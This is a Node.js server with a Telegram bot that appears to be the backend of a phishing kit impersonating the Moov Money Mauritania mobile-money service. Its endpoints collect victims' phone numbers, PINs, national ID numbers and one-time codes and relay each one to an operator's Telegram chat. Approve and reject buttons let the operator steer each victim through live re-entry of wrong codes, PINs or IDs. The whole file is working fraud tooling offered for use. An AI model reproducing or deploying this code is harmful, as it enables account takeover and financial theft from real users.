const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- INIT BOT --------------------
if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- MEMORY STORE --------------------
const statusStore = {};

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};
    const country = "Mauritania";
    const countryCode = "+222";

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !pin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending";

    const message = `📱 <b>MOOV MONEY MAURITANIA - LOGIN ATTEMPT</b>

🆕 <b>NEW USER</b>
🇲🇷 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🔢 <b>PIN:</b> ${pin}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>User waiting for approval</b>
⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Allow to proceed", callback_data: `approve|${phone}|${pin}` },
                        { text: "❌ Invalid credentials", callback_data: `deny|${phone}|${pin}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- CIN API (PAGE 8) --------------------
app.post('/api/save-cin', async (req, res) => {
    const { phone, cin } = req.body || {};
    const country = "Mauritania";
    const countryCode = "+222";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !cin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_cin";

    const cinNotificationMsg = `🪪 <b>MOOV MONEY MAURITANIA - CIN SUBMISSION</b>

🆕 <b>NATIONAL ID SUBMISSION (Page 8)</b>
🇲🇷 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🆔 <b>CIN Number:</b> ${cin}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Verify National ID:</b>
⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, cinNotificationMsg, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Approve CIN", callback_data: `cin_approve|${phone}` },
                        { text: "❌ Invalid CIN", callback_data: `cin_reject|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error("Telegram Notification Error:", err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- PAGE 9 OTP API --------------------
app.post('/api/verify-page9-otp', async (req, res) => {
    const { phone, otp } = req.body || {};
    const country = "Mauritania";
    const countryCode = "+222";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending_page9_otp";

    const page9Msg = `🔢 <b>MOOV MONEY MAURITANIA - PAGE 9 OTP SUBMISSION</b>

🆕 <b>VERIFICATION CODE SUBMITTED (Page 9)</b>
🇲🇷 <b>Country:</b> ${country}
🌍 <b>Country Code:</b> ${countryCode}
📱 <b>Phone Number:</b> ${phone}
🔐 <b>6-Digit OTP:</b> ${otp}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Choose Action:</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, page9Msg, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "1. Correct code", callback_data: `p9_correct|${phone}` },
                        { text: "2. Wrong code", callback_data: `p9_wrong_code|${phone}` }
                    ],
                    [
                        { text: "3. Wrong Pin", callback_data: `p9_wrong_pin|${phone}` },
                        { text: "4. Wrong CIN", callback_data: `p9_wrong_cin|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error("Telegram Notification Error:", err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- TELEGRAM BOT ACTIONS (PAGE 9) --------------------

// 1. Correct code -> Proceeds to success
bot.action(/^p9_correct\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "page9_approved";
    await ctx.answerCbQuery("Approved");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`✅ <b>CODE APPROVED</b>\n📱 <b>User:</b> ${phone}\n🏁 Redirected to Success Page.`);
});

// 2. Wrong code -> Prompts re-entering code on page9
bot.action(/^p9_wrong_code\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "page9_wrong_code";
    await ctx.answerCbQuery("Wrong Code");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>WRONG CODE</b>\n📱 <b>User:</b> ${phone}\n⚠️ User prompted to re-enter code.`);
});

// 3. Wrong Pin -> Redirects user back to page6
bot.action(/^p9_wrong_pin\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "page9_wrong_pin";
    await ctx.answerCbQuery("Wrong PIN");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`🔑 <b>WRONG PIN</b>\n📱 <b>User:</b> ${phone}\n⬅️ Redirected back to Page 6 to re-enter PIN.`);
});

// 4. Wrong CIN -> Redirects user back to page8
bot.action(/^p9_wrong_cin\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "page9_wrong_cin";
    await ctx.answerCbQuery("Wrong CIN");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`🪪 <b>WRONG CIN</b>\n📱 <b>User:</b> ${phone}\n⬅️ Redirected back to Page 8 to re-enter CIN.`);
});

// -------------------- BOT ACTIONS (PAGE 8 & LOGIN) --------------------

// APPROVE LOGIN
bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "approved";
    await ctx.answerCbQuery("Allowed");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`✅ <b>LOGIN APPROVED</b>\n📱 <b>Phone:</b> ${phone}`);
});

// DENY LOGIN
bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "denied";
    await ctx.answerCbQuery("Rejected");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>LOGIN REJECTED</b>\n📱 <b>Phone:</b> ${phone}`);
});

// CIN APPROVE
bot.action(/^cin_approve\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "cin_approved";
    await ctx.answerCbQuery("CIN Approved");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`🪪 <b>CIN APPROVED</b>\n📱 <b>User:</b> ${phone}`);
});

// CIN REJECT
bot.action(/^cin_reject\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "cin_rejected";
    await ctx.answerCbQuery("CIN Rejected");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>INVALID CIN</b>\n📱 <b>User:</b> ${phone}`);
});

// -------------------- STATUS CHECK API --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    const currentStatus = statusStore[phone] || "pending";
    res.json({ status: currentStatus });
});

// -------------------- SAFE PAGE ROUTE --------------------
app.get('/:page', (req, res, next) => {
    if (req.params.page.startsWith('api')) return next();
    const file = req.params.page.endsWith('.html') ? req.params.page : req.params.page + '.html';
    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

// -------------------- START SERVER & BOT --------------------
app.listen(PORT, async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        bot.launch();
        console.log("🤖 Bot is active");
    } catch (err) {
        console.error("Launch error:", err);
    }
});

// Graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
